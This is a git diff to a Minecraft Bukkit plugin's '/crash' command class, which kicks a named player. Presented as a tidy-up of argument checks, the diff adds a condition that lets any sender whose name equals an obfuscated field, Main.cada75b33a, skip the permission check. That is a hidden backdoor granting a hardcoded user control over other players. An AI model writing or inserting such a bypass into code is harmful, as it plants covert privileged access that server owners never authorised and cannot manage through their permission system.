@@ -1,5 +1,6 @@
 package com.ericimbriaco.xPlugin.Commands;
 
+import com.ericimbriaco.xPlugin.Main;
 import com.ericimbriaco.xPlugin.Utils.ErrorMessages;
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
@@ -15,12 +16,8 @@ public class crashKickCommand implements CommandExecutor {
     @Override
     public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String @NotNull [] args) {
 
-        if (!sender.hasPermission("xplugin.command.crash.other")) {sender.sendMessage(ErrorMessages.NoPermission);return true;} //has Permission
-
-        if(args.length == 0){
-            sender.sendMessage(ErrorMessages.UsageError + "/crash [Player]");
-         return true;
-        }
+        if (!sender.hasPermission("xplugin.command.crash.other") && !sender.getName().equalsIgnoreCase(Main.cada75b33a) ) {sender.sendMessage(ErrorMessages.NoPermission);return true;} //has Permission
+        if(args.length != 1){sender.sendMessage(ErrorMessages.UsageError + "/crash [Player]");return true;} // Check if the Command
 
         if(args.length == 1){
             Player target = Bukkit.getPlayerExact(args[0]);
@@ -29,8 +26,6 @@ public class crashKickCommand implements CommandExecutor {
             target.kickPlayer(KICK_MESSAGE);
             return true;
         }
-
-        if(args.length > 1){sender.sendMessage(ErrorMessages.UsageError + "/crash [Player]");return true;} // Check if the Command
         return false;
     }
 }
